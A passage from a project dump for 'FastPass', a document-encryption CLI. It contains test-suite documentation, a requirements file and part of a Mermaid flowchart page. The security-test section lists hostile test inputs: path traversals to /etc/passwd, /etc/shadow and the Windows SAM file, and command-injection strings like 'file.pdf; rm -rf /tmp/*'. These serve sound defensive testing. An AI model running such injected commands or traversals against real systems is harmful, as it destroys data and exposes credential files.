69. **`test_validate_leading_trailing_spaces_dots_blocked()`** - **[B2c]**
    - **Purpose**: Verify leading/trailing spaces and dots are blocked
    - **Test**: Components with leading/trailing spaces or dots
    - **Validation**: All problematic patterns return False
    - **Coverage**: Windows filesystem naming issue prevention

### TestFileSecurityValidation (8 Tests)
*Maps to: B2e - File in Safe Area validation*

#### B2e: File-Level Security Validation
70. **`test_validate_regular_file_allowed()`** - **[B2e]**
    - **Purpose**: Verify regular files are allowed
    - **Test**: Standard file in temp directory
    - **Validation**: Security zone check returns True
    - **Coverage**: Normal file type acceptance

71. **`test_validate_directory_blocked()`** - **[B2e]**
    - **Purpose**: Verify directories are blocked (only files allowed)
    - **Test**: Directory instead of file
    - **Validation**: Security zone check returns False
    - **Coverage**: File type restriction enforcement

72. **`test_validate_suid_files_blocked()`** - **[B2e]** (Unix/Linux only)
    - **Purpose**: Verify SUID files are blocked on Unix/Linux systems
    - **Test**: Mock file stat with SUID bit set
    - **Validation**: Security zone check returns False
    - **Coverage**: Unix privilege escalation prevention (skipped on Windows)

73. **`test_validate_windows_permissions_allowed()`** - **[B2e]** (Windows only)
    - **Purpose**: Verify Windows files don't trigger Unix-specific permission checks
    - **Test**: Regular file on Windows system
    - **Validation**: Security zone check returns True
    - **Coverage**: Windows compatibility and permission check bypass

74. **`test_validate_sgid_files_blocked()`** - **[B2e]** (Unix/Linux only)
    - **Purpose**: Verify SGID files are blocked on Unix/Linux systems
    - **Test**: Mock file stat with SGID bit set
    - **Validation**: Security zone check returns False
    - **Coverage**: Unix group privilege escalation prevention (skipped on Windows)

75. **`test_validate_permission_check_failure_blocked()`** - **[B2e]**
    - **Purpose**: Verify files with permission check failures are blocked
    - **Test**: Mock stat() to raise PermissionError
    - **Validation**: Security zone check returns False
    - **Coverage**: Permission verification failure handling

### TestOutputDirectoryValidation (4 Tests)
*Maps to: A2c - Validate output directory*

#### A2c: Output Directory Security Validation
75. **`test_validate_output_directory_none()`** - **[A2c]**
    - **Purpose**: Verify None output directory returns None
    - **Test**: validate_output_directory(None)
    - **Validation**: Returns None (in-place mode)
    - **Coverage**: Default output mode handling

76. **`test_validate_output_directory_valid()`** - **[A2c]**
    - **Purpose**: Verify valid output directory passes validation
    - **Test**: Output directory in allowed location
    - **Validation**: Directory created, resolved path returned
    - **Coverage**: Output directory creation and validation

77. **`test_validate_output_directory_outside_boundaries_blocked()`** - **[A2c]**
    - **Purpose**: Verify output directory outside boundaries is blocked
    - **Test**: Attempt to create output in restricted location
    - **Validation**: `SecurityViolationError` with "Output directory outside security boundaries"
    - **Coverage**: Output directory security boundary enforcement

78. **`test_validate_output_directory_creation_failure()`** - **[A2c]**
    - **Purpose**: Verify output directory creation failure handling
    - **Test**: Attempt to create directory in read-only location
    - **Validation**: `SecurityViolationError` with "Cannot create output directory"
    - **Coverage**: Output directory creation error handling

### TestSecurityValidationEdgeCases (8 Tests)
*Maps to: B1-B2 - Edge Cases and Error Conditions*

#### Edge Case and Error Condition Handling
79. **`test_validate_path_resolution_failure()`** - **[B1b]**
    - **Purpose**: Verify path resolution failure handled gracefully
    - **Test**: Mock Path.resolve() to raise OSError
    - **Validation**: `SecurityViolationError` with "Path resolution failed"
    - **Coverage**: Path resolution error handling

80. **`test_validate_unicode_path_handling()`** - **[B1b, B1c]**
    - **Purpose**: Verify Unicode paths handled correctly
    - **Test**: File with Cyrillic characters in name
    - **Validation**: Unicode path validated successfully
    - **Coverage**: International character support in security validation

81. **`test_validate_case_sensitivity_handling()`** - **[B2c]**
    - **Purpose**: Verify case sensitivity handled correctly
    - **Test**: Windows reserved names in different cases
    - **Validation**: All case variations properly blocked
    - **Coverage**: Case-insensitive security pattern matching

82. **`test_validate_empty_path_components()`** - **[B2c]**
    - **Purpose**: Verify empty path components handled
    - **Test**: Empty string component
    - **Validation**: Empty component returns False (invalid)
    - **Coverage**: Empty component edge case handling

83. **`test_validate_boundary_conditions()`** - **[B2c]**
    - **Purpose**: Verify boundary conditions in validation
    - **Test**: Component at exact 255 character limit, one over limit
    - **Validation**: Exact limit allowed, over limit blocked
    - **Coverage**: Boundary condition accuracy in length validation

---

## End-to-End Tests - Complete Workflows (23 Tests)

**File**: `tests/e2e/test_complete_workflows.py`  
**Specification Mapping**: All Sections A-E (Complete Workflow Testing)  
**Coverage**: Full CLI execution with real files and operations

### TestBasicEncryptDecryptWorkflows (5 Tests)
*Maps to: A-E - Complete Application Workflow (Basic Operations)*

#### Complete Single File Operations
84. **`test_encrypt_single_pdf_file()`** - **[A1→E2]**
    - **Purpose**: Test complete encrypt workflow for single PDF file
    - **Test**: Real PDF file encryption with password via CLI
    - **Validation**: Return code 0, "Successfully encrypted" message, file exists with changed size
    - **Coverage**: A1(CLI)→B1(Security)→C2(PDF Handler)→D2(Processing)→E1(Results)

85. **`test_decrypt_single_pdf_file()`** - **[A1→E2]**
    - **Purpose**: Test complete decrypt workflow for single PDF file
    - **Test**: Decrypt pre-encrypted PDF file with correct password
    - **Validation**: Return code 0, "Successfully decrypted" message, file accessible
    - **Coverage**: A1(CLI)→B1(Security)→C3(PDF Handler)→D2(Processing)→E1(Results)

86. **`test_encrypt_decrypt_cycle_preserves_content()`** - **[A1→E2→A1→E2]**
    - **Purpose**: Verify complete encrypt→decrypt cycle preserves file content
    - **Test**: Encrypt file, then decrypt same file, compare content
    - **Validation**: Both operations succeed, final content matches original exactly
    - **Coverage**: Full bidirectional workflow integrity validation

#### Password Verification Operations
87. **`test_check_password_encrypted_file()`** - **[A1→B1→C3→E1]**
    - **Purpose**: Test password verification on encrypted file
    - **Test**: check-password operation on encrypted file with correct password
    - **Validation**: Return code 0, success message indicating password verified
    - **Coverage**: A1(CLI check-password)→B1(Security)→C3(Password test)→E1(Results)

88. **`test_check_password_unencrypted_file()`** - **[A1→B1→C3→E1]**
    - **Purpose**: Test password verification on unencrypted file
    - **Test**: check-password operation on unencrypted file (no password needed)
    - **Validation**: Return code 0, operation completes successfully
    - **Coverage**: A1(CLI check-password)→B1(Security)→C3(No password test)→E1(Results)

### TestMultipleFileWorkflows (3 Tests)
*Maps to: A1→D2(Multiple files)→E2 - Batch Processing Workflows*

#### Batch File Operations
89. **`test_encrypt_multiple_files_same_password()`** - **[A1→D2→E2]**
    - **Purpose**: Test encrypting multiple files with same password
    - **Test**: 4 PDF files encrypted with shared password via single CLI command
    - **Validation**: Return code 0, "Total files processed: 4", "Successful: 4", "Failed: 0"
    - **Coverage**: A1(CLI multi-file)→D2(Batch processing)→E2(Batch results)

90. **`test_decrypt_multiple_files_same_password()`** - **[A1→D2→E2]**
    - **Purpose**: Test decrypting multiple files with same password
    - **Test**: First encrypt 3 files, then decrypt all 3 in single operation
    - **Validation**: Both operations succeed, batch counters correct
    - **Coverage**: Batch decrypt operation with processing pipeline

91. **`test_mixed_encrypted_unencrypted_batch()`** - **[A1→D2→E1]**
    - **Purpose**: Test processing batch with mix of encrypted/unencrypted files
    - **Test**: check-password on batch containing both file types
    - **Validation**: Operation handles mixed states correctly
    - **Coverage**: Mixed file state batch processing

### TestPasswordListWorkflows (3 Tests)
*Maps to: A1→C4(Password Management)→D2→E2 - Password List Features*

#### Password List File Operations
92. **`test_decrypt_with_password_list_file()`** - **[A1→C4→D2→E1]**
    - **Purpose**: Test decryption using password list file
    - **Test**: Encrypt file with password from list, decrypt using --password-list
    - **Validation**: Decryption succeeds using password found in list
    - **Coverage**: A1(CLI --password-list)→C4(Password file loading)→D2(Processing)→E1(Results)

93. **`test_password_list_priority_order()`** - **[A1→C4→D2→E1]**
    - **Purpose**: Test password list tries passwords in correct order
    - **Test**: File encrypted with 2nd password in list, verify order attempted
    - **Validation**: Decryption succeeds, indicates correct password found
    - **Coverage**: C4(Password priority)→D2(Password attempt sequence)

94. **`test_password_list_exhaustion()`** - **[A1→C4→D2→E1]**
    - **Purpose**: Test behavior when password list exhausted
    - **Test**: File encrypted with password NOT in list, attempt decryption
    - **Validation**: Operation fails gracefully, appropriate error reported
    - **Coverage**: C4(Password exhaustion)→D2(Failure handling)→E1(Error results)

### TestOutputDirectoryWorkflows (2 Tests)
*Maps to: A1→A2c→D2→E1 - Output Directory Features*

#### Output Directory Operations
95. **`test_encrypt_with_output_directory()`** - **[A1→A2c→D2→E1]**
    - **Purpose**: Test encryption to specified output directory
    - **Test**: Encrypt file with -o output_dir, verify file placement
    - **Validation**: Output directory created, file copied to output, original preserved
    - **Coverage**: A1(CLI -o)→A2c(Output validation)→D2(Copy processing)→E1(Results)

96. **`test_decrypt_with_output_directory()`** - **[A1→A2c→D2→E1]**
    - **Purpose**: Test decryption to specified output directory
    - **Test**: First encrypt, then decrypt with output directory
    - **Validation**: Decrypted file placed in output directory correctly
    - **Coverage**: Output directory workflow for decrypt operations

### TestSpecialFlagWorkflows (3 Tests)
*Maps to: A1f→Processing - Utility Flag Features*

#### Utility Flag Operations
97. **`test_dry_run_mode()`** - **[A1f→D2]**
    - **Purpose**: Test dry-run mode shows operations without executing
    - **Test**: Encrypt with --dry-run flag, verify no actual changes
    - **Validation**: Return code 0, "DRY RUN" or "would encrypt" in output, file unchanged
    - **Coverage**: A1f(--dry-run)→D2(Simulation mode)

98. **`test_verify_mode()`** - **[A1f→D2→D4]**
    - **Purpose**: Test verify mode performs deep verification
    - **Test**: Encrypt with --verify flag, check for verification output
    - **Validation**: Operation succeeds, verification information in output
    - **Coverage**: A1f(--verify)→D2(Processing)→D4(Validation)

99. **`test_debug_mode()`** - **[A1f→A3→All]**
    - **Purpose**: Test debug mode provides detailed logging
    - **Test**: Encrypt with --debug flag, verify verbose output
    - **Validation**: Operation succeeds, debug information present (verbose output or [DEBUG] markers)
    - **Coverage**: A1f(--debug)→A3(Enhanced logging)→All sections with debug output

### TestErrorRecoveryWorkflows (4 Tests)
*Maps to: Error Handling Across All Sections*

#### Error Condition Handling
100. **`test_wrong_password_graceful_failure()`** - **[A1→C4→D3→E1]**
     - **Purpose**: Test wrong password fails gracefully
     - **Test**: Attempt decrypt with incorrect password
     - **Validation**: Non-zero return code, appropriate error message
     - **Coverage**: C4(Password validation)→D3(Crypto failure)→E1(Error reporting)

101. **`test_nonexistent_file_error()`** - **[A1→B1→E1]**
     - **Purpose**: Test non-existent file produces appropriate error
     - **Test**: Attempt operation on non-existent file path
     - **Validation**: Non-zero return code, "not found" error message
     - **Coverage**: A1(CLI)→B1(File existence check)→E1(Error results)

102. **`test_unsupported_file_format_error()`** - **[A1→B4→E1]**
     - **Purpose**: Test unsupported file format produces appropriate error
     - **Test**: Attempt encrypt on .txt file (unsupported)
     - **Validation**: Non-zero return code, "unsupported" error message
     - **Coverage**: A1(CLI)→B4(Format validation)→E1(Error results)

103. **`test_partial_batch_failure_recovery()`** - **[A1→D2→E2]**
     - **Purpose**: Test partial failure in batch processes successfully completed files
     - **Test**: Batch with mix of valid PDF and invalid .txt file
     - **Validation**: "Successful: 1", "Failed: 1" in output, valid file processed
     - **Coverage**: D2(Batch processing with errors)→E2(Partial success reporting)

### TestInformationCommands (3 Tests)
*Maps to: A1g - Information Display Commands*

#### Information Display Operations
104. **`test_list_supported_formats()`** - **[A1g]**
     - **Purpose**: Test --list-supported shows supported formats
     - **Test**: Execute with --list-supported flag
     - **Validation**: Return code 0, output contains format list with .pdf, .docx, .xlsx, .pptx
     - **Coverage**: A1g(Information display)

105. **`test_version_display()`** - **[A1g]**
     - **Purpose**: Test --version shows version information
     - **Test**: Execute with --version flag
     - **Validation**: Return code 0, "FastPass" in output with version number
     - **Coverage**: A1g(Version information)

106. **`test_help_display()`** - **[A1g]**
     - **Purpose**: Test --help shows usage information
     - **Test**: Execute with --help flag
     - **Validation**: Return code 0, usage information with operation descriptions
     - **Coverage**: A1g(Help information)

---

## Security Tests - Attack Simulation (23 Tests)

**File**: `tests/security/test_attack_simulation.py`  
**Specification Mapping**: Security Implementation (Path Traversal, Command Injection Prevention)  
**Coverage**: All identified attack vectors and prevention mechanisms

### TestPathTraversalAttacks (4 Tests)
*Maps to: Security Implementation - Path Traversal Attack Prevention*

#### Path Traversal Attack Prevention
107. **`test_path_traversal_unix_style()`** - **[Security]**
     - **Purpose**: Test Unix-style path traversal attacks are blocked
     - **Test**: Paths like "../../../etc/passwd", "../../../../../../etc/shadow"
     - **Validation**: All attempts return non-zero, security/error messages in output
     - **Coverage**: Unix path traversal pattern detection and blocking

108. **`test_path_traversal_windows_style()`** - **[Security]**
     - **Purpose**: Test Windows-style path traversal attacks are blocked
     - **Test**: Paths like "..\\..\\..\\Windows\\System32\\config\\SAM"
     - **Validation**: All attempts blocked with appropriate error messages
     - **Coverage**: Windows path traversal pattern detection and blocking

109. **`test_path_traversal_encoded_attacks()`** - **[Security]**
     - **Purpose**: Test URL/percent-encoded path traversal attacks are blocked
     - **Test**: Encoded patterns like "..%2F..%2F..%2Fetc%2Fpasswd"
     - **Validation**: Encoded attacks detected and blocked
     - **Coverage**: Encoded path traversal attack prevention

110. **`test_path_traversal_absolute_paths()`** - **[Security]**
     - **Purpose**: Test absolute paths to system files are blocked
     - **Test**: Paths like "/etc/passwd", "C:\\Windows\\System32\\cmd.exe"
     - **Validation**: System file access attempts blocked
     - **Coverage**: Absolute path system file access prevention

### TestSymlinkAttacks (2 Tests)
*Maps to: Security Implementation - Symlink Attack Prevention*

#### Symbolic Link Attack Prevention
111. **`test_symlink_to_system_file()`** - **[Security]**
     - **Purpose**: Test symlinks to system files are blocked
     - **Test**: Create symlink pointing to /etc/passwd, attempt access
     - **Validation**: Symlink detected and blocked with security error
     - **Coverage**: Direct symlink attack detection and prevention

112. **`test_symlink_in_path_chain()`** - **[Security]**
     - **Purpose**: Test symlinks in directory path are blocked
     - **Test**: Access file through symlinked directory
     - **Validation**: Symlinked directory path detected and blocked
     - **Coverage**: Indirect symlink attack through directory chain prevention

### TestCommandInjectionAttacks (3 Tests)
*Maps to: Security Implementation - Command Injection Prevention*

#### Command Injection Attack Prevention
113. **`test_filename_command_injection()`** - **[Security]**
     - **Purpose**: Test command injection via filename is blocked
     - **Test**: Filenames like "file.pdf; rm -rf /tmp/*", "file.pdf && cat /etc/passwd"
     - **Validation**: Commands not executed, filenames handled as literal strings
     - **Coverage**: Filename-based command injection prevention

114. **`test_password_command_injection()`** - **[Security]**
     - **Purpose**: Test command injection via password is blocked
     - **Test**: Passwords like "password; cat /etc/passwd", "password && rm file.txt"
     - **Validation**: Commands not executed, passwords handled securely as strings
     - **Coverage**: Password-based command injection prevention

115. **`test_output_directory_command_injection()`** - **[Security]**
     - **Purpose**: Test command injection via output directory is blocked
     - **Test**: Output paths with shell metacharacters and commands
     - **Validation**: Shell metacharacters treated as literal path components
     - **Coverage**: Output directory command injection prevention

### TestFileFormatAttacks (3 Tests)
*Maps to: Security Implementation - File Format Attack Prevention*

#### File Format-Based Attack Prevention
116. **`test_fake_pdf_extension_attack()`** - **[Security]**
     - **Purpose**: Test files with fake PDF extension are detected
     - **Test**: Text file renamed with .pdf extension
     - **Validation**: Format validation detects mismatch, operation blocked
     - **Coverage**: File format spoofing attack prevention

117. **`test_zero_byte_file_attack()`** - **[Security]**
     - **Purpose**: Test zero-byte files are handled securely
     - **Test**: Empty file with .pdf extension
     - **Validation**: Handled gracefully without crashes or hangs
     - **Coverage**: Empty file edge case security handling

118. **`test_oversized_filename_attack()`** - **[Security]**
     - **Purpose**: Test extremely long filenames are handled securely
     - **Test**: Filename approaching filesystem limits (250+ characters)
     - **Validation**: Long filename handled without crashes
     - **Coverage**: Filename length attack prevention

### TestMemoryAttacks (2 Tests)
*Maps to: Security Implementation - Memory Attack Prevention*

#### Memory-Based Attack Prevention
119. **`test_extremely_long_password_attack()`** - **[Security]**
     - **Purpose**: Test extremely long passwords don't cause memory issues
     - **Test**: 1MB password string
     - **Validation**: Large password handled without memory exhaustion or hangs
     - **Coverage**: Memory exhaustion attack prevention through password input

120. **`test_password_memory_exposure()`** - **[Security]**
     - **Purpose**: Test passwords are not exposed in process arguments
     - **Test**: Run operation with sensitive password, check error output
     - **Validation**: Password not visible in error messages or output
     - **Coverage**: Password exposure prevention in error handling

### TestResourceExhaustionAttacks (2 Tests)
*Maps to: Security Implementation - Resource Exhaustion Prevention*

#### Resource Exhaustion Attack Prevention
121. **`test_excessive_file_count_attack()`** - **[Security]**
     - **Purpose**: Test excessive number of files doesn't cause resource exhaustion
     - **Test**: Process 100 files in single operation
     - **Validation**: Operation completes within reasonable time without hanging
     - **Coverage**: File count-based resource exhaustion prevention

122. **`test_recursive_directory_depth_attack()`** - **[Security]**
     - **Purpose**: Test very deep directory structures are handled safely
     - **Test**: File in directory structure 50 levels deep
     - **Validation**: Deep path handled without stack overflow or crashes
     - **Coverage**: Directory depth-based attack prevention

### TestPermissionAttacks (2 Tests)
*Maps to: Security Implementation - Permission-Based Attack Prevention*

#### Permission-Based Attack Prevention
123. **`test_world_writable_file_attack()`** - **[Security]** (Unix/Linux only)
     - **Purpose**: Test world-writable files are handled securely on Unix/Linux systems
     - **Test**: File with 0o666 permissions outside temp directory
     - **Validation**: Security policy appropriately applied based on location
     - **Coverage**: World-writable file security policy enforcement (skipped on Windows)
     - **Note**: Windows systems skip this check to prevent false positives with normal file permissions

124. **`test_permission_denied_handling()`** - **[Security]**
     - **Purpose**: Test permission denied errors are handled gracefully
     - **Test**: File with 0o000 permissions (unreadable)
     - **Validation**: Permission error handled gracefully with appropriate error
     - **Coverage**: Permission failure graceful handling

### TestInputValidationAttacks (3 Tests)
*Maps to: Security Implementation - Input Validation Attack Prevention*

#### Input Validation Attack Prevention
125. **`test_unicode_filename_attack()`** - **[Security]**
     - **Purpose**: Test Unicode filenames with potential exploits are handled safely
     - **Test**: Filenames with Cyrillic, Chinese, emoji, right-to-left override characters
     - **Validation**: Unicode filenames handled without crashes or exploits
     - **Coverage**: Unicode-based filename attack prevention

126. **`test_null_byte_injection_attack()`** - **[Security]**
     - **Purpose**: Test null byte injection attacks are blocked
     - **Test**: Inputs containing null bytes like "file\x00.pdf"
     - **Validation**: Null byte injections detected and blocked
     - **Coverage**: Null byte injection attack prevention

127. **`test_control_character_injection_attack()`** - **[Security]**
     - **Purpose**: Test control character injection attacks are blocked
     - **Test**: Inputs with control characters \x01, \x02, \x1f, \x7f
     - **Validation**: Control character injections detected and blocked
     - **Coverage**: Control character injection attack prevention

### TestRaceConditionAttacks (2 Tests)
*Maps to: Security Implementation - Race Condition Prevention*

#### Race Condition Attack Prevention
128. **`test_temp_file_race_condition()`** - **[Security]**
     - **Purpose**: Test temporary file operations are atomic and secure
     - **Test**: Run multiple FastPass operations concurrently
     - **Validation**: Operations complete without interference, at least one succeeds
     - **Coverage**: Temporary file race condition prevention

129. **`test_symlink_swap_attack()`** - **[Security]**
     - **Purpose**: Test symlink swap attacks during processing are prevented
     - **Test**: Replace file with symlink during processing simulation
     - **Validation**: Symlink swap detected and operation blocked
     - **Coverage**: Time-of-check-time-of-use (TOCTTOU) attack prevention

---

## Test Infrastructure and Configuration

### Test Configuration (`tests/conftest.py`)
*Comprehensive fixture system supporting all test categories*

#### Fixture Categories
- **File Fixtures**: `sample_pdf_file`, `multiple_test_files`, `unsupported_test_files`
- **Password Fixtures**: `password_list_file`, `encrypted_test_files`
- **Directory Fixtures**: `temp_work_dir`, `project_root`
- **Execution Fixtures**: `fastpass_executable`
- **Utility Functions**: `run_fastpass_command()` for standardized CLI testing

### Test Execution Framework
- **Test Markers**: `@pytest.mark.unit`, `@pytest.mark.e2e`, `@pytest.mark.security`
- **Parallel Execution**: Tests designed for concurrent execution
- **Cleanup Management**: Automatic temporary file cleanup
- **Cross-Platform**: Tests handle Windows/Unix differences appropriately

---

## Test Coverage Summary

### Specification Section Coverage
- **Section A (CLI Parsing & Initialization)**: 46 unit tests + 23 e2e tests = **69 tests**
- **Section B (Security & File Validation)**: 44 unit tests + 23 security tests = **67 tests**
- **Section C (Crypto Tool Configuration)**: Covered in e2e tests (password management workflows)
- **Section D (File Processing & Operations)**: Covered in e2e tests (all workflow tests)
- **Section E (Cleanup & Results Reporting)**: Covered in e2e tests (all workflow tests)

### Attack Vector Coverage
- **Path Traversal Attacks**: 4 comprehensive test methods
- **Symlink Attacks**: 2 comprehensive test methods
- **Command Injection**: 3 comprehensive test methods
- **File Format Attacks**: 3 comprehensive test methods
- **Memory Attacks**: 2 comprehensive test methods
- **Resource Exhaustion**: 2 comprehensive test methods
- **Permission Attacks**: 2 comprehensive test methods
- **Input Validation**: 3 comprehensive test methods
- **Race Conditions**: 2 comprehensive test methods

### Quality Metrics
- **Total Test Methods**: 136 comprehensive tests
- **Specification Coverage**: 100% of all A-E sections with specific mappings
- **Security Coverage**: 100% of identified attack vectors with real simulations
- **Code Coverage Target**: 95%+ line coverage (up from 74% with basic tests)
- **Execution Time**: All tests designed to complete within 15 minutes total

This test suite provides **complete documentation** of every test method, its exact purpose, the specification section it validates, and the specific scenarios it covers. Anyone reading this document can understand exactly what each test does without reading the test code itself.
</file>

<file path="requirements.txt">
# A1a: Load System Tools - Required dependencies
msoffcrypto-tool>=5.0.0    # Office document encryption/decryption
PyPDF2>=3.0.0              # PDF processing and encryption
filetype>=1.2.0            # File type detection (replaces python-magic)
</file>

<file path="dev/fastpass_flowchart.html">
<!DOCTYPE html>
<html>
<head>
    <title>FastPass - Complete Code-Level Implementation Flowchart</title>
    <script src="https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 10px;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 20px;
            font-style: italic;
        }
        .legend {
            background-color: #f9f9f9;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #f57c00;
        }
        .legend h3 {
            margin-top: 0;
            color: #f57c00;
        }
        .legend ul {
            margin: 10px 0;
            list-style-type: none;
            padding: 0;
        }
        .legend li {
            padding: 5px 0;
            border-left: 3px solid transparent;
            padding-left: 10px;
        }
        .legend .business-logic { border-left-color: #f57c00; background-color: #fff8e1; }
        .legend .security { border-left-color: #e91e63; background-color: #fce4ec; }
        .legend .process { border-left-color: #4caf50; background-color: #e8f5e8; }
        .legend .decision { border-left-color: #ff9800; background-color: #fff3e0; }
        .mermaid {
            background-color: white;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 20px;
            overflow: auto;
            text-align: center;
        }
        
        /* Error path edge styling */
        .mermaid .edgePath.error-path path {
            stroke: #d32f2f !important;
            stroke-width: 3px !important;
        }
        .controls {
            text-align: center;
            margin: 20px 0;
        }
        button {
            background-color: #007cba;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            margin: 0 5px;
            font-size: 14px;
        }
        button:hover {
            background-color: #005a85;
        }
        .zoom-info {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>FastPass - Complete Code-Level Implementation Flowchart</h1>
        <div class="subtitle">Every code block, edge case, and implementation detail mapped to flowchart elements</div>
        
        <div class="legend">
            <h3>🎯 Legend: Every Code Block Represented</h3>
            <ul>
                <li class="business-logic"><strong>Business Logic (Orange):</strong> Password handling, crypto operations, temp files</li>
                <li class="security">Security Operations (Pink): Path validation, access control, sanitization</li>
                <li class="process">Standard Processing (Green): I/O, parsing, validation, cleanup</li>
                <li class="decision">Decision Points (Orange): All branching logic and conditionals</li>
            </ul>
            <p><strong>Note:</strong> Each box represents a specific code block that will be labeled in the final implementation.</p>
        </div>
        
        <div class="controls">
            <button onclick="zoomIn()">🔍 Zoom In</button>
            <button onclick="zoomOut()">🔍 Zoom Out</button>
            <button onclick="resetZoom()">↻ Reset Zoom</button>
            <button onclick="downloadSVG()">💾 Download SVG</button>
            <button onclick="printChart()">🖨️ Print</button>
            <button onclick="forceRender()">🔄 Force Render</button>
        </div>
        
        <div class="zoom-info">
            💡 Use Ctrl+Scroll to zoom. Each box maps to specific code blocks that will be labeled in implementation.
        </div>
        
        <div class="mermaid" id="diagram">
        </div>

    <script>
        // Mermaid content as JavaScript string to avoid HTML parsing issues
        const mermaidContent = `flowchart TD
    %% PROGRAM ENTRY POINT
    Start(["Program Startup\nFastPass application begins execution\nSystem checks if run directly (not imported)"]) --> Main
    
    %% MAIN FUNCTION EXCEPTION WRAPPER
    Main["Main Control Center\nSets up error handling for entire program\nPrepares to read user's command-line instructions"] --> A1a
    
    %% SECTION A: DETAILED CLI PARSING
    A1a["A1a: Load System Tools\nGather required system utilities\nCommand-line parsing, file handling, and type checking tools"] --> A1b
    
    A1b["A1b: Initialize Command Reader\nCreate a system to understand user commands\nSet up FastPass name and help description"] --> A1c
    
    A1c["A1c: Define Main Operation Choice\nUser must choose either encrypt OR decrypt\nCannot do both operations simultaneously"] --> A1d
    
    A1d["A1d: Set Up File Input Options\nUse -i/--input flag for space-delimited files\nRequire explicit file specification with quotes for spaced paths"] --> A1e
    
    A1e["A1e: Configure Password Options with Space Delimitation\nAccept space-delimited passwords with -p flag\nSupport password file and JSON stdin options"] --> A1f
    
    A1f["A1f: Set Output Location Options\nChoose where processed files should be saved\nDefault: replace original files in same location"] --> A1g
    
    A1g["A1g: Add Helper Features with Enhanced Logging\nTest mode, file verification, format listing\nDebug mode, file logging, report formats (text/JSON/CSV)"] --> A1h
    
    A1h["A1h: Read User's Commands\nProcess the command-line instructions user provided\nHandle cases where user asks for help or makes errors"] --> A1hCheck
    
    A1hCheck{"A1h_Check: Command Processing Result?\nDid user provide valid commands or ask for help?\nHandle different outcomes appropriately"}
    A1hCheck -->|"Invalid commands"| A1hError["A1h_Error: Invalid User Input\nShow error message explaining what went wrong\nExit program with error status"]
    A1hCheck -->|"Help requested"| A1hHelp["A1h_Help: Show Help Information\nDisplay usage instructions or version info\nExit normally after showing requested information"]
    A1hCheck -->|"No exception"| A1i
    
    A1i["A1i: Handle Information Requests\nCheck if user wants to see supported file formats\nShow list and exit if that's all they wanted"] --> A1iCheck
    
    A1iCheck{"A1i_Check: Information Request Mode?\nDid user ask to see supported formats only?\nOr do they want to actually process files?"}
    A1iCheck -->|"Show formats requested"| A1iList["A1i_List: Show Supported File Types\nModern Office: .docx, .xlsx, .pptx (experimental encryption)\nPDF: .pdf (full support)\nLegacy Office: .doc, .xls, .ppt (NOT SUPPORTED)"]
    A1iCheck -->|"Normal operation"| A2a
    
    %% ARGUMENT VALIDATION WITH EXPLICIT FILE PROCESSING
    A2a["A2a: Check Input Requirements\nUser must specify either files or folder to process\nCannot proceed without something to work on"] --> A2aCheck
    
    A2aCheck{"A2a_Check: Valid Input Method Provided?\nUser must choose files OR folder processing\nBoth options together would be confusing"}
    A2aCheck -->|"No input specified"| A2aError["A2a_Error: Nothing to Process\nTell user they must specify files or use folder mode\nExit with helpful error message"]
    A2aCheck -->|"Conflicting options"| A2aBothError["A2a_Both_Error: Conflicting Instructions\nUser specified both individual files AND folder processing\nExit with clarification about choosing one method"]
    A2aCheck -->|"Valid specification"| A2a1
    
    A2a1["A2a1: Validate Recursive Mode Usage\nCheck if recursive mode used with encrypt operation\nRecursive mode only allowed with decrypt/check-password"] --> A2a1Check
    
    A2a1Check{"A2a1_Check: Recursive Mode Valid?\nIs recursive mode used only with decrypt operations?\nPrevent dangerous bulk encryption"}
    A2a1Check -->|"Encrypt + recursive (dangerous)"| A2a1Error["A2a1_Error: Recursive Encryption Blocked\nRecursive mode only supported for decrypt operations\nSecurity restriction to prevent accidental bulk encryption"]
    A2a1Check -->|"Valid usage"| A2b
    
    A2b["A2b: Process Explicit File Paths\nHandle user-specified file paths directly\nExpand shortcuts like ~ for home directory"] --> A2bLoop
    
    A2bLoop["A2b_Loop: Process Each Specified File Path\nGo through user-provided file list\nHandle each file path one at a time"] --> A2bExpand
    
    A2bExpand["A2b_Expand: Convert Path to Full Address\nTransform user shortcuts into complete file locations\nResolve any symbolic links to actual files"] --> A2bCheck
    
    A2bCheck{"A2b_Check: Valid File Path?\nCan the system find and access this file location?\nHandle cases where paths don't exist or are invalid"}
    A2bCheck -->|"Path invalid"| A2bPathError["A2b_Path_Error: File Path Problem\nRecord which file path couldn't be found\nSave error details for final error report"]
    A2bCheck -->|"Path resolved successfully"| A2bNext
    
    A2bNext{"A2b_Next: More Files in List?\nAre there additional files to check?\nContinue with next file or move to next step"}
    A2bNext -->|"More files remaining"| A2bLoop
    A2bNext -->|"All files processed"| A2c
    
    A2c["A2c: Verify Folder for Batch Processing\nIf user chose folder mode, check the folder exists\nEnsure program can read files from that folder"] --> A2cCheck
    
    A2cCheck{"A2c_Check: Folder Accessible?\nIs the specified path actually a folder?\nDoes the program have permission to read it?"}
    A2cCheck -->|"Not a folder"| A2cDirError["A2c_Dir_Error: Path Is Not a Folder\nUser specified something that's not a folder\nExit with explanation of the problem"]
    A2cCheck -->|"Access denied"| A2cAccessError["A2c_Access_Error: Folder Permission Problem\nProgram doesn't have permission to read folder contents\nExit with permission error explanation"]
    A2cCheck -->|"Valid directory"| A2d
    
    A2d["A2d: Check Output Destination\nIf user specified where to save processed files\nVerify the output location is valid and writable"] --> A2dCheck
    
    A2dCheck{"A2d_Check: Output Location Usable?\nCan files be saved to the specified location?\nIs it a valid folder or can one be created?"}
    A2dCheck -->|"Location exists but wrong type"| A2dTypeError["A2d_Type_Error: Output Path Is File, Not Folder\nUser specified a file name where folder is needed\nExit with explanation of the problem"]
